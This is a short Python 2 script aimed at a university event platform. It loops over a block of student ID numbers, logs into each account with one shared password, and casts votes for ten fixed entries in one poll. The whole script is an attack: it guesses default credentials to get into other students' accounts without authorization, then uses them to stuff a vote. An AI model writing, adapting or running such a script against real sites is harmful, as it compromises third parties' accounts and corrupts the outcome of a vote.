import urllib2  
import cookielib  
  
pid = [36310, 36359, 36270, 36246, 36233, 36545, 36496, 36362, 36373, 36497]  
  
for sno in range(8153200, 8153400):  
    # create cookie  
    cookieJar = cookielib.CookieJar()  
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookieJar))  
  
    # login  
    params = 'school=%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6&sid=622&number=0' + str(sno) + '&password=xxxxxx&login=%E7%99%BB+%E5%BD%95'  
    req = urllib2.Request("http://cumt.pocketuni.net/index.php?app=home&mod=Public&act=doLogin", params)  
    page = opener.open(req)  
  
    for id in pid:  
        # vote  
        params = 'id=160367&pid=%d' % id   
        req = urllib2.Request("http://cumt.pocketuni.net/index.php?app=event&mod=Front&act=vote", params)  
        page = opener.open(req)  
          
    print sno  